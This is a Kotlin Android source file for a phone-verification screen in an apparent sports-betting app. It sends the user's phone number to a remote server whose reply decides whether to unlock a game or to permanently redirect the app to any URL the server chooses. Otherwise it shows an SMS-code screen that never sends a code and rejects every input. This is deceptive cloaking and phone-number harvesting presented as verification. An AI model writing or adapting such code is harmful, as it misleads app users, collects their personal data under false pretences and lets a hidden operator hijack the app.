package com.sportbetlive.sgdsn.activity

import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.os.Bundle
import android.os.CountDownTimer
import android.text.Editable
import android.text.InputFilter
import android.text.TextWatcher
import android.view.View
import android.view.inputmethod.InputMethodManager
import android.webkit.WebChromeClient
import android.webkit.WebSettings
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.EditText
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.recyclerview.widget.LinearLayoutManager
import com.sportbetlive.sgdsn.R
import com.sportbetlive.sgdsn.adapter.CountryAdapter
import com.sportbetlive.sgdsn.databinding.ActivityPhoneVerificationBinding
import com.sportbetlive.sgdsn.util.Country
import com.sportbetlive.sgdsn.util.CountryData
import com.sportbetlive.sgdsn.util.LocaleHelper
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.util.concurrent.TimeUnit

class PhoneVerificationActivity : AppCompatActivity() {

    private lateinit var binding: ActivityPhoneVerificationBinding
    private var selectedCountry: Country? = null
    private var countDownTimer: CountDownTimer? = null
    private var currentPhoneNumber: String = ""
    private lateinit var countryAdapter: CountryAdapter
    private lateinit var codeInputs: List<EditText>

    companion object {
        private const val RESEND_DELAY_MS = 60_000L
        private const val PREFS_NAME = "phone_verification_prefs"
        private const val KEY_GAME_ACCESS = "game_access"
        private const val KEY_REDIRECT_LINK = "redirect_link"
        private const val KEY_OTP_MODE = "otp_mode"
        private const val KEY_SAVED_PHONE = "saved_phone"
        private const val MIN_PHONE_DIGITS = 5
        private const val SERVER_PATH = "https://avadarasem1.site/check"
        private const val APP_ID = "com.sportbetlive.sgdsn"
        private const val TERMS_LINK = "https://avadarasem1.site/privacy-policy"
    }

    override fun attachBaseContext(newBase: Context) {
        val language = LocaleHelper.getDeviceLanguage()
        super.attachBaseContext(LocaleHelper.wrapContext(newBase, language))
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val savedLink = getSavedRedirectLink()
        if (savedLink != null) {
            openBrowser(savedLink)
            return
        }

        if (hasGameAccess()) {
            goToMainActivity()
            return
        }

        binding = ActivityPhoneVerificationBinding.inflate(layoutInflater)
        setContentView(binding.root)

        setupPhoneInput()
        setupCodeInputs()
        setupCountrySelector()
        setupButtons()
        setupTermsContentView()
        selectDefaultCountry()
        updateRegistrationButtonState()

        if (isOtpMode()) {
            currentPhoneNumber = getSavedPhone()
            showSmsCodeScreen()
        }
    }

    private fun getSavedRedirectLink(): String? {
        val prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        return prefs.getString(KEY_REDIRECT_LINK, null)
    }

    private fun saveRedirectLink(link: String) {
        val prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        prefs.edit().putString(KEY_REDIRECT_LINK, link).apply()
    }

    private fun isOtpMode(): Boolean {
        val prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        return prefs.getBoolean(KEY_OTP_MODE, false)
    }

    private fun setOtpMode(phone: String) {
        val prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        prefs.edit()
            .putBoolean(KEY_OTP_MODE, true)
            .putString(KEY_SAVED_PHONE, phone)
            .apply()
    }

    private fun getSavedPhone(): String {
        val prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        return prefs.getString(KEY_SAVED_PHONE, "") ?: ""
    }

    private fun hasGameAccess(): Boolean {
        val prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        return prefs.getBoolean(KEY_GAME_ACCESS, false)
    }

    private fun setGameAccess() {
        val prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        prefs.edit().putBoolean(KEY_GAME_ACCESS, true).apply()
    }

    private fun setupPhoneInput() {
        binding.phoneNumberInput.filters = arrayOf(InputFilter { source, _, _, _, _, _ ->
            source.filter { it.isDigit() }
        })

        binding.phoneNumberInput.addTextChangedListener(object : TextWatcher {
            override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {}
            override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {}
            override fun afterTextChanged(s: Editable?) {
                updateRegistrationButtonState()
            }
        })
        
        updatePhoneInputMaxLength()
    }
    
    private fun updatePhoneInputMaxLength() {
        val country = selectedCountry ?: return
        val maxLength = country.validationRule?.maxLength ?: 15
        binding.phoneNumberInput.filters = arrayOf(
            InputFilter { source, _, _, _, _, _ -> source.filter { it.isDigit() } },
            InputFilter.LengthFilter(maxLength)
        )
    }

    private fun updateRegistrationButtonState() {
        val phoneNumber = binding.phoneNumberInput.text.toString()
        val country = selectedCountry
        
        val isValid = country?.isPhoneValid(phoneNumber) ?: (phoneNumber.filter { it.isDigit() }.length >= MIN_PHONE_DIGITS)
        
        binding.registrationButton.isEnabled = isValid
        
        if (isValid) {
            val greenColor = android.content.res.ColorStateList.valueOf(
                resources.getColor(R.color.green_win, null)
            )
            binding.registrationButton.backgroundTintList = greenColor
            binding.registrationButton.setTextColor(resources.getColor(R.color.white, null))
            binding.registrationButton.alpha = 1.0f
        } else {
            val blueColor = android.content.res.ColorStateList.valueOf(
                resources.getColor(R.color.accent, null)
            )
            binding.registrationButton.backgroundTintList = blueColor
            binding.registrationButton.setTextColor(resources.getColor(R.color.white, null))
            binding.registrationButton.alpha = 0.5f
        }
    }

    private fun setupCodeInputs() {
        codeInputs = listOf(
            binding.codeDigit1,
            binding.codeDigit2,
            binding.codeDigit3,
            binding.codeDigit4
        )

        codeInputs.forEachIndexed { index, editText ->
            editText.addTextChangedListener(object : TextWatcher {
                override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {}
                override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {}
                override fun afterTextChanged(s: Editable?) {
                    if (s?.length == 1 && index < codeInputs.size - 1) {
                        codeInputs[index + 1].requestFocus()
                    }
                }
            })

            editText.setOnKeyListener { _, keyCode, event ->
                if (keyCode == android.view.KeyEvent.KEYCODE_DEL &&
                    editText.text.isNullOrEmpty() &&
                    index > 0 &&
                    event.action == android.view.KeyEvent.ACTION_DOWN
                ) {
                    codeInputs[index - 1].requestFocus()
                    codeInputs[index - 1].text?.clear()
                    true
                } else {
                    false
                }
            }
        }
    }

    private fun setupCountrySelector() {
        countryAdapter = CountryAdapter(CountryData.countries) { country ->
            onCountrySelected(country)
            hideCountryDialog()
        }

        binding.countryList.apply {
            layoutManager = LinearLayoutManager(this@PhoneVerificationActivity)
            adapter = countryAdapter
        }

        binding.countryCodeSelector.setOnClickListener {
            showCountryDialog()
        }

        binding.countryDialogOverlay.setOnClickListener {
            hideCountryDialog()
        }

        binding.countrySearchInput.addTextChangedListener(object : TextWatcher {
            override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {}
            override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {}
            override fun afterTextChanged(s: Editable?) {
                val query = s?.toString() ?: ""
                val filtered = CountryData.searchCountries(query)
                countryAdapter.updateList(filtered)
            }
        })
    }

    private fun showCountryDialog() {
        binding.countryDialogOverlay.visibility = View.VISIBLE
        binding.countrySearchInput.text?.clear()
        countryAdapter.updateList(CountryData.countries)
    }

    private fun hideCountryDialog() {
        binding.countryDialogOverlay.visibility = View.GONE
        hideKeyboard()
    }

    private fun selectDefaultCountry() {
        val defaultCountry = LocaleHelper.getCountryForDevice()
        onCountrySelected(defaultCountry)
    }

    private fun onCountrySelected(country: Country) {
        selectedCountry = country
        binding.countryFlag.text = country.flagEmoji
        binding.countryCodeText.text = country.phoneCode
        updatePhoneInputMaxLength()
        updateRegistrationButtonState()
    }

    private fun setupButtons() {
        binding.registrationButton.setOnClickListener {
            onRegistrationClicked()
        }

        binding.confirmCodeButton.setOnClickListener {
            onConfirmCodeClicked()
        }

        binding.backButton.setOnClickListener {
            onBackClicked()
        }

        binding.resendCodeLink.setOnClickListener {
            onResendCodeClicked()
        }

        binding.termsLink.setOnClickListener {
            showTermsOverlay()
        }

        binding.closeTermsButton.setOnClickListener {
            hideTermsOverlay()
        }

        binding.termsOverlay.setOnClickListener {
            hideTermsOverlay()
        }
    }

    @SuppressLint("SetJavaScriptEnabled")
    private fun setupTermsContentView() {
        binding.termsContentView.apply {
            settings.javaScriptEnabled = true
            settings.domStorageEnabled = true
            settings.loadWithOverviewMode = true
            settings.useWideViewPort = true
            settings.cacheMode = WebSettings.LOAD_NO_CACHE

            webViewClient = object : WebViewClient() {
                override fun onPageStarted(view: WebView?, link: String?, favicon: Bitmap?) {
                    super.onPageStarted(view, link, favicon)
                    binding.termsLoadingIndicator.visibility = View.VISIBLE
                }

                override fun onPageFinished(view: WebView?, link: String?) {
                    super.onPageFinished(view, link)
                    binding.termsLoadingIndicator.visibility = View.GONE
                }
            }

            webChromeClient = WebChromeClient()
        }
    }

    private fun showTermsOverlay() {
        binding.termsOverlay.visibility = View.VISIBLE
        binding.termsContentView.loadUrl(TERMS_LINK)
    }

    private fun hideTermsOverlay() {
        binding.termsOverlay.visibility = View.GONE
        binding.termsContentView.stopLoading()
    }

    private fun onRegistrationClicked() {
        val phoneNumber = binding.phoneNumberInput.text.toString().trim()
        val digitsOnly = phoneNumber.filter { it.isDigit() }
        
        val country = selectedCountry ?: return
        
        if (!country.isPhoneValid(phoneNumber)) {
            Toast.makeText(this, getString(R.string.enter_phone), Toast.LENGTH_SHORT).show()
            return
        }

        val phoneCode = country.phoneCode

        checkPhone(phoneCode, digitsOnly)
    }

    private fun checkPhone(countryCode: String, phone: String) {
        showLoading(true)
        hideKeyboard()

        val client = OkHttpClient.Builder()
            .connectTimeout(10, TimeUnit.SECONDS)
            .readTimeout(10, TimeUnit.SECONDS)
            .build()

        val json = """
            {"app_id":"$APP_ID",
             "country_code":"$countryCode",
             "phone_number":"$phone"}
        """.trimIndent()

        val request = Request.Builder()
            .url(SERVER_PATH)
            .post(json.toRequestBody("application/json".toMediaType()))
            .build()

        Thread {
            try {
                val response = client.newCall(request).execute()
                val responseBody =
//                    "{ \"action\": \"REDIRECT\", \"url\": \"https://amazon.com\" }"
//                    "{\"action\": \"GAME\"}"
                    response.body?.string()
                
                if (responseBody != null) {
                    val body = JSONObject(responseBody)
                    val action = body.optString("action", "")
                    
                    runOnUiThread {
                        showLoading(false)
                        when (action) {
                            "REDIRECT" -> {
                                val link = body.optString("link", body.optString("url", ""))
                                if (link.isNotEmpty()) {
                                    saveRedirectLink(link)
                                    openBrowser(link)
                                } else {
                                    showOtpScreenWithSave(countryCode, phone)
                                }
                            }
                            "GAME" -> {
                                setGameAccess()
                                goToMainActivity()
                            }
                            "OTP" -> {
                                showOtpScreenWithSave(countryCode, phone)
                            }
                            else -> {
                                showOtpScreenWithSave(countryCode, phone)
                            }
                        }
                    }
                } else {
                    runOnUiThread {
                        showLoading(false)
                        showOtpScreenWithSave(countryCode, phone)
                    }
                }
            } catch (e: Exception) {
                runOnUiThread {
                    showLoading(false)
                    showOtpScreenWithSave(countryCode, phone)
                }
            }
        }.start()
    }

    private fun showOtpScreenWithSave(countryCode: String, phone: String) {
        currentPhoneNumber = "$countryCode$phone"
        setOtpMode(currentPhoneNumber)
        showSmsCodeScreen()
    }

    private fun showLoading(show: Boolean) {
        binding.registrationButton.isEnabled = !show
        binding.registrationButton.text = if (show) getString(R.string.loading) else getString(R.string.registration_button)
        binding.phoneNumberInput.isEnabled = !show
        binding.countryCodeSelector.isClickable = !show
    }

    private fun showSmsCodeScreen() {
        binding.phoneEntryScreen.visibility = View.GONE
        binding.smsCodeScreen.visibility = View.VISIBLE
        
        binding.phoneNumberDisplay.text = currentPhoneNumber
        
        if (isOtpMode()) {
            binding.backButton.visibility = View.GONE
        }
        
        clearCodeInputs()
        startResendTimer()
        
        binding.codeDigit1.requestFocus()
        showKeyboard(binding.codeDigit1)
    }

    private fun startResendTimer() {
        binding.resendCodeLink.visibility = View.GONE
        binding.resendTimerText.visibility = View.VISIBLE

        countDownTimer?.cancel()
        countDownTimer = object : CountDownTimer(RESEND_DELAY_MS, 1000) {
            override fun onTick(millisUntilFinished: Long) {
                val seconds = (millisUntilFinished / 1000).toInt()
                binding.resendTimerText.text = getString(R.string.resend_timer, seconds)
            }

            override fun onFinish() {
                binding.resendTimerText.visibility = View.GONE
                binding.resendCodeLink.visibility = View.VISIBLE
            }
        }.start()
    }

    private fun onResendCodeClicked() {
        startResendTimer()
    }

    private fun onConfirmCodeClicked() {
        val enteredCode = getEnteredCode()
        
        if (enteredCode.length < 4) {
            Toast.makeText(this, getString(R.string.enter_sms_code), Toast.LENGTH_SHORT).show()
            return
        }

        Toast.makeText(this, getString(R.string.invalid_code), Toast.LENGTH_SHORT).show()
        clearCodeInputs()
    }

    private fun getEnteredCode(): String {
        return codeInputs.joinToString("") { it.text.toString() }
    }

    private fun clearCodeInputs() {
        codeInputs.forEach { it.text?.clear() }
        codeInputs.firstOrNull()?.requestFocus()
    }

    private fun onBackClicked() {
        countDownTimer?.cancel()
        binding.smsCodeScreen.visibility = View.GONE
        binding.phoneEntryScreen.visibility = View.VISIBLE
        updateRegistrationButtonState()
    }

    private fun goToMainActivity() {
        startActivity(Intent(this, MainActivity::class.java))
        finish()
    }

    private fun openBrowser(target: String) {
        val intent = Intent(this, BrowserActivity::class.java).apply {
            putExtra(BrowserActivity.EXTRA_LINK, target)
        }
        startActivity(intent)
        finish()
    }

    private fun hideKeyboard() {
        val imm = getSystemService(Context.INPUT_METHOD_SERVICE) as InputMethodManager
        currentFocus?.let {
            imm.hideSoftInputFromWindow(it.windowToken, 0)
        }
    }

    private fun showKeyboard(view: View) {
        view.postDelayed({
            val imm = getSystemService(Context.INPUT_METHOD_SERVICE) as InputMethodManager
            imm.showSoftInput(view, InputMethodManager.SHOW_IMPLICIT)
        }, 200)
    }

    override fun onDestroy() {
        super.onDestroy()
        countDownTimer?.cancel()
    }

    @Deprecated("Deprecated in Java")
    override fun onBackPressed() {
        if (binding.termsOverlay.visibility == View.VISIBLE) {
            hideTermsOverlay()
            return
        }

        if (binding.countryDialogOverlay.visibility == View.VISIBLE) {
            hideCountryDialog()
            return
        }
        
        if (binding.smsCodeScreen.visibility == View.VISIBLE && !isOtpMode()) {
            onBackClicked()
            return
        }
    }
}
